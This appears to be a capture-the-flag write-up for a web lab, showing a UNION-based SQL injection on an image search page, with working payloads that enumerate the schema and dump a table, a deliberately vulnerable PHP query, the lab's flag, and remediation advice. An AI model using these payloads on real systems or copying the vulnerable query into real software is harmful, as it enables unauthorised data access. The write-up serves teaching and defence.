# SQL Injection — Image Search Page

## Summary

The image search form at `/index.php?page=searchimg` passes user input directly into a SQL query without sanitization or parameterization. By injecting a `UNION SELECT` payload, it is possible to enumerate the database schema via `information_schema` and dump the contents of any table. Querying the `list_images` table reveals the flag.

---

## Category

**SQL Injection**
OWASP: [A03:2021 – Injection](https://owasp.org/Top10/A03_2021-Injection/)

---

## Steps to Reproduce

### 1. Identify the vulnerable parameter

The search form submits a numeric ID via GET:

```
http://{MACHINE_IP}/index.php?page=searchimg&id=1&Submit=Submit#
```

Submitting a normal value returns an image title and URL. The `id` parameter is passed unsanitized into the backend SQL query.

### 2. Determine the number of columns

Probe the query's column count using `UNION SELECT` with NULL placeholders until no error is returned:

```sql
1 UNION SELECT NULL, NULL
```

Two NULLs succeed → the query returns **2 columns**.

### 3. Enumerate tables via information_schema

Inject into `information_schema.tables` to list every table in the database:

```sql
1 UNION SELECT table_name, NULL FROM information_schema.tables
```

This reveals, among others, a table named **`list_images`**.

### 4. Dump the target table

Query `list_images` directly. Using `-1` as the base ID ensures no legitimate row is matched, so only the injected result is returned:

```sql
-1 UNION SELECT title, comment FROM list_images
```

The response contains the flag embedded in the `comment` column.

### 5. Flag

```
Title   : Hack me ?
Comment : If you read this just use this md5 decode lowercase then sha256 to win this flag !: 1928e8083cf461a51303633093573c46
Flag    : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

---

## Why This Works

SQL injection is only possible when user input is concatenated directly into a query string. This application has none of the standard defenses:

- **No prepared statements** — the raw `id` value is inserted into the query string at runtime
- **No input validation** — non-numeric values and SQL keywords are accepted without rejection
- **No error suppression** — database errors and result rows are reflected directly in the response, aiding enumeration
- **information_schema accessible** — the database user has read access to metadata tables, making full schema enumeration trivial

---

## Root Cause

| Problem | Detail |
|---|---|
| Unsanitized input | The `id` GET parameter is concatenated directly into the SQL query |
| No parameterized queries | String interpolation means injected SQL is executed verbatim |
| Overprivileged DB user | The application's DB account can read `information_schema` |
| Error/result reflection | Query output is rendered in the page, enabling data exfiltration |

The vulnerable backend pattern looks like:

```php
// Vulnerable
$query = "SELECT id, title FROM list_images WHERE id = " . $_GET['id'];
```

---

## Remediation

### 1. Use prepared statements with parameterized queries

Never interpolate user input into a query string. Bind parameters instead:

```php
// Safe (PDO)
$stmt = $pdo->prepare("SELECT id, title FROM list_images WHERE id = :id");
$stmt->execute([':id' => $_GET['id']]);
```

The database driver then treats the value strictly as data, not as SQL syntax, regardless of its content.

### 2. Validate and cast input types

For numeric parameters, cast immediately and reject non-numeric values:

```php
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
if ($id === false || $id === null) {
    http_response_code(400);
    exit("Invalid input");
}
```

### 3. Apply the principle of least privilege to the database user

The application's database account should only have `SELECT` on the specific tables it needs — never access to `information_schema` or other databases:

```sql
-- Grant only what is needed
GRANT SELECT ON app_db.list_images TO 'app_user'@'localhost';
```

### 4. Suppress detailed error output in production

Database error messages should never reach the end user. Log them server-side only:

```php
// php.ini / runtime
ini_set('display_errors', '0');
ini_set('log_errors', '1');
```

### 5. Consider a Web Application Firewall (WAF) as a secondary layer

A WAF can detect and block common injection patterns as a defense-in-depth measure, but it must never replace parameterized queries at the code level.

---

## References

- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP: SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html)
- [PortSwigger: SQL Injection — UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
